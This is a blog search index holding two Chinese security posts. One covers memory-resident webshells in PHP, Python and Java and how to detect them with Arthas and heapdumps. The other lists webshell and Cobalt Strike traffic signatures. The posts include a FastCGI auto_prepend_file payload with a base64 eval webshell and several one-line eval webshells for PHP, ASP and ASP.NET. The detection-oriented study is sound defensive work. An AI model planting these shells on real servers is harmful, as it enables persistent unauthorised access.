<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内存马</title>
      <link href="/2023/08/12/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/08/12/%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="1-PHP内存马："><a href="#1-PHP内存马：" class="headerlink" title="1.PHP内存马："></a>1.PHP内存马：</h1><p>1.<strong>“不死”马</strong>：所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码。缺点是阻塞进程，而且很多时候还是要本地落盘文件</p><p>2.<strong>Fastcgi马</strong>：这个利用了 PHP-FPM 可以直接通过 fastcgi 协议通讯的原理，可以指定SCRIPT_FILENAME，去执行机器上存在的 PHP 文件；或者配合auto_prepend_file+php:&#x2F;&#x2F;input，通过每次提交POST code去执行。（年代久远）。严格说只是对 FPM 未授权访问的漏洞利用</p><p>3.<strong>改进的****Fastcgi马</strong></p><p>从 PHP-FPM 这个 fastcgi server 的实现上，这个 FPM 的进程就是持久化的，并且并不会如传统 CGI 模式一样，处理一个请求就会消亡。因此只要能在这个进程上下文中保存信息，就可实现。</p><p><strong>在一次 fastcgi 请求中，任何通过 PHP_VALUE&#x2F;PHP_ADMIN_VALUE 修改过的PHP配置值，在此 FPM 进程的生命周期内，都是会保留下来的。</strong>于是，只需要把前面提到的2.<strong>Fastcgi马</strong>略微改一下即可。</p><p>触发方式延续着之前的auto_prepend_file的方案，但由于我们是想要内存马，我们不再沿用php:&#x2F;&#x2F;input，否则还得每次都得提交代码，而是替换成data协议固定下来。假设在我们获取到一个 Web 的权限后——甚至我们可能只需要一个 SSRF 漏洞即可——我们只需要往 fpm 监听的端口发送如下结构的内容（这里是我本机测试）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">15</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;GATEWAY_INTERFACE&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;FastCGI/1.0&quot;</span></span><br><span class="line">    [<span class="string">&quot;REQUEST_METHOD&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;GET&quot;</span></span><br><span class="line">    [<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">30</span>) <span class="string">&quot;/home/www/wofeiwo/t.php&quot;</span></span><br><span class="line">    [<span class="string">&quot;SCRIPT_NAME&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;/wofeiwo/t.php&quot;</span></span><br><span class="line">    [<span class="string">&quot;QUERY_STRING&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">    [<span class="string">&quot;REQUEST_URI&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;/wofeiwo/t.php&quot;</span></span><br><span class="line">    [<span class="string">&quot;DOCUMENT_URI&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;/wofeiwo/t.php&quot;</span></span><br><span class="line">    [<span class="string">&quot;PHP_ADMIN_VALUE&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">102</span>) <span class="string">&quot;allow_url_include = On</span></span><br><span class="line"><span class="string">auto_prepend_file = \&quot;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\&quot;&quot;</span></span><br><span class="line">    [<span class="string">&quot;SERVER_SOFTWARE&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;80sec/wofeiwo&quot;</span></span><br><span class="line">    [<span class="string">&quot;REMOTE_ADDR&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    [<span class="string">&quot;REMOTE_PORT&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;9985&quot;</span></span><br><span class="line">    [<span class="string">&quot;SERVER_ADDR&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    [<span class="string">&quot;SERVER_PORT&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;80&quot;</span></span><br><span class="line">    [<span class="string">&quot;SERVER_NAME&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    [<span class="string">&quot;SERVER_PROTOCOL&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可看到，由于不需要php:&#x2F;&#x2F;input，我们只需要 GET 请求即可，并且，<strong>构造请求只需要随意给一个存在的 php 文件路径</strong>，无所谓内容是啥。一个发包搞定一切，我们的 payload 已经无文件植入了。由于使用了auto_prepend_file，因此我们<strong>只需要访问服务器上任意一个正常的 PHP 文件，无需任何修改，都能触发我们的内存马。</strong></p><p>我们访问个普通的 phpinfo.php 文件，看看是否能够稳定的固化我们的内存马。</p><p><img src="1663336789906-de9cad6a-c131-4947-90db-83861d5c02c9.png" alt="img"></p><p>i果然已经成功的把我们想要的payload植入了进去。这里我们payload使用的是<?php @eval($_REQUEST[test]); ?>的 base64。我们访问phpinfo.php?test&#x3D;echo(aaaaa);看看效果，当然正常使用的时候我们可以更隐蔽。</p><p><img src="1663336826447-00150b7a-6616-48c7-82a3-997b218e67d8.png" alt="img"></p><p>i当然，这个方案也有局限性，因为是内存马，所以他实际上是和PHP-FPM的 Worker 进程绑定的，因此，如果服务器上有多个Worker进程，我们就需要多发送刚才的请求几次，才能让我们的payload“感染”每一个进程。</p><p>此外，我们还需要关注一个php-fpm.conf的配置:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pm.max_requests <span class="keyword">int</span> </span><br><span class="line">设置每个子进程重生之前服务的请求数。对于可能存在内存泄漏的第三方模块来说是非常有用的。</span><br><span class="line">如果设置为 <span class="string">&#x27;0&#x27;</span> 则一直接受请求，等同于 PHP_FCGI_MAX_REQUESTS 环境变量。默认值：<span class="number">0</span></span><br></pre></td></tr></table></figure><p>这个配置定义了每一个 worker 进程最大处理多少请求，就会自动重生。主要作用可能是避免内存泄露，但是一旦重生了，我们的内存马也就失效了。默认是不会重生的。</p><h3 id="检测思路："><a href="#检测思路：" class="headerlink" title="检测思路："></a>检测思路：</h3><ol><li>检查所有php进程处理请求的持续时间</li><li>检测执行文件是否在文件系统真实存在</li></ol><p>克制：</p><p>使用条件竞争写入同名文件进行克制不死马。</p><h2 id="2-Python内存马"><a href="#2-Python内存马" class="headerlink" title="2.Python内存马"></a>2.Python内存马</h2><p>利用flask框架的ssti注入来实现，flask框架在web应用模板的渲染过程中用到render_template_string()函数进行渲染，但是未对用户输入的代码进行过滤，导致可以注入恶意代码实现内存马</p><h3 id="检测思路：-1"><a href="#检测思路：-1" class="headerlink" title="检测思路："></a>检测思路：</h3><ol><li>查看所有内建模块中是否包含eval、exec等可以执行代码的函数如：class ‘warnings.catch_warnings’、class ‘site.Quitter’等。</li><li>检测self.add_url_rule()中特殊名字的路由如shell等。</li></ol><h2 id="3-JAVA内存马"><a href="#3-JAVA内存马" class="headerlink" title="3.JAVA内存马"></a>3.JAVA内存马</h2><p>首先客户端向服务端发起一个web请求，中间件的各独立组件如Lisrener、filter，servlet等进行监听、判断、过滤等操作，内存马利用请求过程在内存中修改一个已有的组件或动态注册一个新的组件，插入shellcode达到持续化的控制服务器</p><h3 id="3-1-filter内存马"><a href="#3-1-filter内存马" class="headerlink" title="3.1.filter内存马"></a>3.1.filter内存马</h3><p>filter作为过滤器组件可以对用户的请求进行拦截和修改，当web.xml注册了一个filter对某个servlet程序进行拦截处理时，可以对S容器发送给S程序的请求和S程序回送给S容器的响应进行拦截，可以对请求和响应信息进行修改。filter型内存马是将执行命令的文件通过动态注册成一个恶意的filter，没有落地文件但是可以让客户端发送请求通过他来执行命令。</p><h4 id="filter检测思路："><a href="#filter检测思路：" class="headerlink" title="filter检测思路："></a>filter检测思路：</h4><ol><li>带有特殊含义的filter的名字比如shell等。</li><li>Filter的优先级，filter内存马需要将filter调至最高</li><li>查看web.xml中有没有filter配置</li><li>检测特殊的classloader</li><li>检测classloader路径下没有class文件</li><li>检测Filter中的doFilter方法是否有恶意代码</li></ol><h2 id="内存马判断"><a href="#内存马判断" class="headerlink" title="内存马判断"></a>内存马判断</h2><p> 先判断是通过什么方法注入的内存马，可以先查看web日志是否有可疑的web访问日志，如果是filter或者listener类型就会有大量url请求路径相同但参数不同的日志</p><p>页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。</p><p><strong>查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马</strong>。如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀:"></a>内存马查杀:</h2><p>java-memshell-<a href="https://so.csdn.net/so/search?q=scanner&spm=1001.2101.3001.7020">scanner</a></p><p>​             cop.jar首先可以先看result.txt中标记高危的class，cop.jar工具会把所有的文件都还原成jsp文件，可以用D盾等webshell查杀工具进行扫描。</p><p> 3.arthas-boot.jar工具地址：<a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></p><p>​    工具使用思路：arthas-boot.jar工具可以先排除可疑名字的servlet和filter节点，如攻击者隐藏的更深需要将所有的类都反编译导出来然后逐一排查。</p><h2 id="arthas实例"><a href="#arthas实例" class="headerlink" title="arthas实例"></a>arthas实例</h2><h3 id="安装-Arthas"><a href="#安装-Arthas" class="headerlink" title="安装 Arthas"></a>安装 Arthas</h3><p><a href="https://github.com/alibaba/arthas/releases">https://github.com/alibaba/arthas/releases</a></p><p>下载压缩包解压执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/alibaba/arthas/releases/download/arthas-all-3.6.6/arthas-bin.zip</span><br><span class="line">unzip arthas-bin.zip</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure><p>植入内存马之前查看内存中mbean信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mbean | grep &quot;name=/&quot;</span><br></pre></td></tr></table></figure><p><img src="1675434796035-6576d887-87b7-4179-bba4-fddf25fc450d.png" alt="img"></p><h3 id="1-哥斯拉内存🐎"><a href="#1-哥斯拉内存🐎" class="headerlink" title="1.哥斯拉内存🐎"></a>1.哥斯拉内存🐎</h3><p>哥斯拉的webshell提供了memoryShell和FilterShell两种内存🐎</p><h4 id="1-1-FilterShell"><a href="#1-1-FilterShell" class="headerlink" title="1.1.FilterShell"></a>1.1.FilterShell</h4><p><img src="1675434881770-a46a5d59-3c62-466f-a8b3-627a1dfbdf23.png" alt="img"></p><p><img src="1675434895250-6863d257-db9a-45ce-bc18-c14e3a1d678d.png" alt="img"></p><p>使用以下两条命令都可以看到哥斯拉的Filter内存马name中都带有时间戳。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc *.Filter</span><br><span class="line">sc -d org.apache.coyote.SerializationConfig</span><br></pre></td></tr></table></figure><p><img src="1675434939273-e45a22fc-ac4f-4d66-a99c-f63321090426.png" alt="img"></p><p>使用jad反编译我们认为可疑的类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jad org.apache.coyote.SerializationConfig</span><br></pre></td></tr></table></figure><p><img src="1675434999099-9cc44232-c166-4a1b-944a-1741403bd162.png" alt="img"></p><p>代码中大量运用invoke反射来实现。</p><h4 id="1-2-memoryShell"><a href="#1-2-memoryShell" class="headerlink" title="1.2.memoryShell"></a>1.2.memoryShell</h4><p><img src="1675435022585-19b035f3-6b3b-47f5-bfc9-ed5921ddabda.png" alt="img"></p><p>添加该内存马后通过mbean可以看到多了几个servlet。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mbean | grep &quot;name=/&quot;</span><br><span class="line">sc *.Servlet</span><br></pre></td></tr></table></figure><p><img src="1675435049182-4c963329-6436-47c4-b49c-6b0e6bf78666.png" alt="img"><br> <img src="1675435070423-01a26494-b1fd-4d71-bcff-eb9fb73337ee.png" alt="img"></p><p>可疑的classloader。</p><p><img src="1675435094197-f03541d8-65d5-4d53-b006-debf7d3f67d3.png" alt="img"></p><h3 id="2-冰蝎内存🐎"><a href="#2-冰蝎内存🐎" class="headerlink" title="2.冰蝎内存🐎"></a>2.冰蝎内存🐎</h3><h4 id="2-1-常规思路"><a href="#2-1-常规思路" class="headerlink" title="2.1.常规思路"></a>2.1.常规思路</h4><p>冰蝎内存马由于对底层函数做了hook的操作，所以特征更弱一些。</p><p>先生成冰蝎4.0的服务端，上传后连接注入内存马。</p><p><img src="1675435165497-41d31104-9c29-456f-b36b-29434e99adf3.png" alt="img"></p><p>开启冰蝎的防检测功能。</p><p><img src="1675435182095-adb2788d-2707-407f-b685-4223e63e78fd.png" alt="img"></p><p>连上内存马。</p><p><img src="1675435203959-e6c79f5f-ed09-4615-b3a4-2cde7874bcd6.png" alt="img"></p><p>冰蝎的classloader。</p><p><img src="1675435220378-0139fbf8-97fd-4d2c-a891-758505950fff.png" alt="img"></p><p><img src="1675435230069-e8a38c31-3d0e-4671-8559-9033f6ddd349.png" alt="img"></p><p>冰蝎🐴属于Servlet类型的，不过并不是加载内存马之后才有的，而是连接冰蝎服务端的时候就有的。</p><p>反编译冰蝎的马，可以看到明显AES加密的key</p><p><img src="1675435257613-ee0d925f-2aa7-428f-b8e1-5fc57d3091ff.png" alt="img"></p><h4 id="2-2-heapdump-内存排查—终极排查思路"><a href="#2-2-heapdump-内存排查—终极排查思路" class="headerlink" title="2.2..heapdump 内存排查—终极排查思路"></a>2.2..heapdump 内存排查—终极排查思路</h4><p>不管冰蝎的内存马如何hook，但是内存🐴肯定是在内存中的。并且访问的时候是有路由映射的。那么内存dump出来的文件肯定会有记录。</p><p>heapdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof| grep &quot;POST /&quot;</span><br></pre></td></tr></table></figure><p><img src="1675435342328-a6a06b61-d3e2-4491-ac92-1f954566c57a.png" alt="img"></p><h4 id="2-3-查找内存中web目录的可疑路径。-strings-var-cache-tomcat-temp-heapdump2022-10-19-12-464292342944555007800-hprof-grep-E-webapps-sort-u"><a href="#2-3-查找内存中web目录的可疑路径。-strings-var-cache-tomcat-temp-heapdump2022-10-19-12-464292342944555007800-hprof-grep-E-webapps-sort-u" class="headerlink" title="2.3.查找内存中web目录的可疑路径。  strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof| grep -E &quot;/webapps/.*?\!&quot;| sort -u"></a>2.3.查找内存中web目录的可疑路径。 <code> strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof| grep -E &quot;/webapps/.*?\!&quot;| sort -u</code></h4><p><img src="1675435433424-4875e926-e441-4032-be02-0cd4eaa45dd7.png" alt="img"></p><p>Arthas可能报错<br><code>Unable to opensocket file: target process not responding or HotSpot VM not loaded</code></p><p><img src="1675435598352-11aafa64-85a8-434c-b8ed-d6505e01179e.png" alt="img"></p><p>该报错是因为tomcat是以tomcat用户运行的，而我们用arthas是用root用户运行的。JVM 只能 attach 同样用户下的 java 进程。</p><p>使用runuser命令即可以tomcat用户运行arthas。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runuser -l tomcat -c &quot;java -jar /usr/share/tomcat/arthas-boot.jar&quot;</span><br></pre></td></tr></table></figure><p><img src="1675435633720-e05fa44a-7718-410e-a534-1b2fff79fdc0.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用webshell连接工具流量特征和攻击判断</title>
      <link href="/2023/08/12/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%92%8C%E6%94%BB%E5%87%BB%E5%88%A4%E6%96%AD/"/>
      <url>/2023/08/12/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%92%8C%E6%94%BB%E5%87%BB%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="1-菜刀"><a href="#1-菜刀" class="headerlink" title="1.菜刀"></a>1.菜刀</h2><p>后门自测：<a href="https://github.com/raddyfiy/caidao-official-version">https://github.com/raddyfiy/caidao-official-version</a></p><h3 id="1-1静态特征"><a href="#1-1静态特征" class="headerlink" title="1.1静态特征"></a>1.1静态特征</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP:    &lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt;</span><br><span class="line">ASP:    &lt;%eval request(&quot;1&quot;)%&gt;</span><br><span class="line">ASP.NET:    &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;1&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;1&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><h3 id="1-2动态特征"><a href="#1-2动态特征" class="headerlink" title="1.2动态特征"></a>1.2动态特征</h3><h4 id="1-2-1请求包"><a href="#1-2-1请求包" class="headerlink" title="1.2.1请求包"></a>1.2.1请求包</h4><p>ua头为百度爬虫</p><p>请求体中存在eavl，base64等特征字符</p><p>请求体中传递的payload为base64编码，并且存在固定的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</span><br></pre></td></tr></table></figure><p>另外就是很明显的一个base64解密式和一个payload</p><h4 id="1-2-2返回包"><a href="#1-2-2返回包" class="headerlink" title="1.2.2返回包"></a>1.2.2返回包</h4><p>响应为明文，格式为<a href="mailto:并且在X@Y./">X@Y   结果</a>X@Y之中</p><p>php的webshel中流量参数z0、z1、z2</p><h2 id="2-蚁剑"><a href="#2-蚁剑" class="headerlink" title="2.蚁剑"></a>2.蚁剑</h2><p><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><h3 id="2-1静态特征"><a href="#2-1静态特征" class="headerlink" title="2.1静态特征"></a>2.1静态特征</h3><h3 id="2-2动态特征"><a href="#2-2动态特征" class="headerlink" title="2.2动态特征"></a>2.2动态特征</h3><h5 id="2-2-1默认编码连接时"><a href="#2-2-1默认编码连接时" class="headerlink" title="2.2.1默认编码连接时"></a>2.2.1默认编码连接时</h5><p>一句话webshell</p><h6 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h6><p>都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且存在base64等字符</p><h6 id="响应包"><a href="#响应包" class="headerlink" title="响应包"></a>响应包</h6><p>格式为  随机数 结果  随机数</p><h5 id="2-2-2使用base64编码器和解码器时"><a href="#2-2-2使用base64编码器和解码器时" class="headerlink" title="2.2.2使用base64编码器和解码器时"></a>2.2.2使用base64编码器和解码器时</h5><p>随机生成一个参数传入base64编码后的代码，密码参数的值是通过POST获取随机参数的值然后进行base64解码后使用eval执行</p><p>响应包的结果返回格式为  随机数 编码后的结果  随机数</p><h2 id="3-冰蝎"><a href="#3-冰蝎" class="headerlink" title="3.冰蝎"></a>3.冰蝎</h2><p><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p><h3 id="3-1静态3-0版本"><a href="#3-1静态3-0版本" class="headerlink" title="3.1静态3.0版本"></a>3.1静态3.0版本</h3><p>采用<strong>预共享密钥</strong>，密钥格式为md5(“admin”)[0:16], 所以在各种语言的webshell中都会存在16位数的连接密码，默认变量为k。</p><p>在<strong>PHP</strong>中会判断是否开启openssl采用不同的加密算法，在代码中同样会存在eval或assert等字符特征</p><p><img src="1654166631026-826eec4d-27b8-403e-9578-43cb196fb875.png" alt="img"></p><p>在<strong>asp</strong>中会在for循环进行一段异或处理</p><p><img src="1654166724540-92acf9ba-e141-47a6-9098-8ff14e0f4de4.png" alt="img"></p><p>在<strong>jsp</strong>中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</p><p><img src="1654166739927-d16e2a1e-c412-4c59-86b8-d2edaebf3b44.png" alt="img"></p><h3 id="3-2-2-0动态"><a href="#3-2-2-0动态" class="headerlink" title="3.2 2.0动态"></a>3.2 2.0动态</h3><p>2.0中采用<strong>协商密钥机制</strong>。第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br></pre></td></tr></table></figure><p><img src="1654166883514-3d9bdaa1-beb6-4c04-add0-d1f9d3787b7f.png" alt="img"></p><p>建立连接后 所有请求 Cookie的格式都为: Cookie: PHPSESSID&#x3D;; path&#x3D;&#x2F;；</p><p>useragent有十多种，若没有修改，每次发包会随机选择一个</p><h3 id="3-3-3-0动态"><a href="#3-3-3-0动态" class="headerlink" title="3.3 3.0动态"></a>3.3 3.0动态</h3><p><strong>去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，</strong>密钥格式为md5(“admin”)[0:16],但还是会存在一些特征</p><p>在使用<strong>命令执行功能</strong>时</p><p>请求包中</p><p><code>1.content-length 为5740或5720</code>（可能会根据Java版本而改变）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2.Pragma: no-cache，Cache-Control: no-cache</span><br><span class="line">3.Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">4.content-type: application/octet-stream</span><br><span class="line">5.默认内置 16 个 user-agent</span><br></pre></td></tr></table></figure><h3 id="3-3-3-11流量特征"><a href="#3-3-3-11流量特征" class="headerlink" title="3.3 3.11流量特征"></a>3.3 3.11流量特征</h3><p>1、header头顺序是颠倒的</p><p>2、发送包是base64，返回包是字节数组，所以会乱码</p><p>3、如果冰蝎密码不对，会出现两个连接，第一个是post 第二个是get </p><ol start="4"><li>content-type为application&#x2F;octet-stream ，请求包中content-length 为5740或5720（可能会根据Java版本而改变)，每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache</li></ol><p>5.异常User-Agent—- 出现WOW64等</p><h2 id="4-哥斯拉"><a href="#4-哥斯拉" class="headerlink" title="4.哥斯拉"></a>4.哥斯拉</h2><p><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><p>哥斯拉的webshell需要动态生成，可以根据需求选择各种不同的加密方式</p><p>1.不修改User-Agent，User-Agent会类似于Java&#x2F;1.8.0_121（具体什么版本取决于JDK环境版本）</p><p>2.在请求包的Cookie中有一个非常致命的特征，最后的分号，标准的HTTP请求中最后一个Cookie的值是不应该出现“;”的</p><h3 id="4-1-静态特征"><a href="#4-1-静态特征" class="headerlink" title="4.1 静态特征"></a>4.1 静态特征</h3><p>选择<strong>默认脚本编码生成</strong>的情况下</p><p><strong>jsp</strong>会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征</p><p>php，asp则为普通的一句话木马</p><h3 id="4-2-动态特征"><a href="#4-2-动态特征" class="headerlink" title="4.2 动态特征"></a>4.2 动态特征</h3><p>所有请求中<code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</code></p><p>所有响应中<code>Cache-Control: no-store, no-cache, must-revalidate,</code></p><p>以上两个只能作为弱特征参考</p><p>同时在所有请求中：</p><ol><li>Cookie中后面都存在<code>；</code>符号</li><li>“pass&#x3D;”起始</li><li>请求包较长 响应包为0</li><li>一个tcp包里面有三个http</li></ol><p>整个响应包的结构体征为：md5前十六位+base64+md5后十六位</p><h3 id="4-3-4-0-1中JAVA-AES-BASE64特征流量"><a href="#4-3-4-0-1中JAVA-AES-BASE64特征流量" class="headerlink" title="4.3 4.0.1中JAVA_AES_BASE64特征流量"></a>4.3 <strong>4.0.1中JAVA_AES_BASE64特征流量</strong></h3><p>发送包是密码&#x3D;bae64字符串的形式，返回包是类base64字符串的格式</p><ol><li>对称加密算法：JAVA_AES_BASE64是哥斯拉4.0.1使用的对称加密算法;因此可以根据哥斯拉4.0.1的流量中是否包含JAVA_AES_BASE64来判断是否为哥斯拉4.0.1攻击流量</li><li>长度固定：哥斯拉4.0.1使用JAVA_AES_BASE64算法对数据进行加密后，加密后数据的长度是固定的因此，可以根据攻击流量的长度是否固定来判断是否为哥斯拉4.0.1攻击流量</li><li>常见数据前缀：哥斯拉4.0.1加密的数据在明文数据前会添加特定的前缀;因此，可以根据攻击流量中是否包含常见的数据前缀来判断是否为哥斯拉4.0.1攻击流量。</li></ol><h2 id="5-CS"><a href="#5-CS" class="headerlink" title="5.CS"></a>5.CS</h2><p>1、http-beacon通信中，默认使用get方法向&#x2F;dpixel、&#x2F;__utm.gif、&#x2F;pixel.gif等地址发起请求，同时请求头存在cookie字段并且值为base64编码</p><p>2、dns-beacon通信中，默认使用cdn.、www6.、api.、www.、post.为开头发起dns请求，并且查询结果伴随0.0.0.0、0.0.0.80、0.0.0.241等非常规IP</p><p>3、心跳包间隔一定时间，均有通信，且流级上的上下行数据长度固定</p><p>4、Cobalt Strike通常使用自定义的User-Agent字符串，例如Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) Cobalt Strike</p><p>5、命令和控制流量：Cobalt Strike的HTTP请求中可能包含与C2服务器通信的命令和控制信息，这些信息在正常的Web请求中不会出现。</p><h2 id="6-如何判断是struts2漏洞执行命令？"><a href="#6-如何判断是struts2漏洞执行命令？" class="headerlink" title="6.如何判断是struts2漏洞执行命令？"></a>6.<strong>如何判断是struts2漏洞执行命令？</strong></h2><ol><li>在请求头中存在<strong>OGNL表达式</strong>，Struts2 命令执行的原理是通过 Ognl 表达式执行 java 代码，一般在url中会出现的攻击特征主要是:.<code>action?method</code>或者<code>?redirect:$ </code></li></ol><p>在conten-type中出现的攻击特征主要有:<code>%&#123;#context</code> 、在报文体中出现的攻击特征主要有:<code>#_memberAccess </code>等</p><ol start="2"><li>判断请求中是否包含特定的 Struts2 关键字，如”method:”、”redirect:”等，这些关键字可能是用于执行命令的操作；</li><li>检查请求中是否包含”Content-Type”头字段，并且值为<code>&quot;application/x-www-form-urlencoded&quot;</code>，这是 Struts2 框架默认的 Content-Type 值，用于处理 POST 请求；</li><li>检查请求参数中是否包含OGNL表达式，如<code>&quot;$&#123;&#125;&quot;、&quot;%&#123;&#125;&quot;</code>等字符；</li><li>检查请求是否包含一个名为”class”的参数，值为”java.lang.Runtime”，这个参数可以用于执行系统命令</li></ol><p>成功否</p><p><img src="1688660062913-2f3197be-2f56-4f80-9199-dd4b422feae1.png" 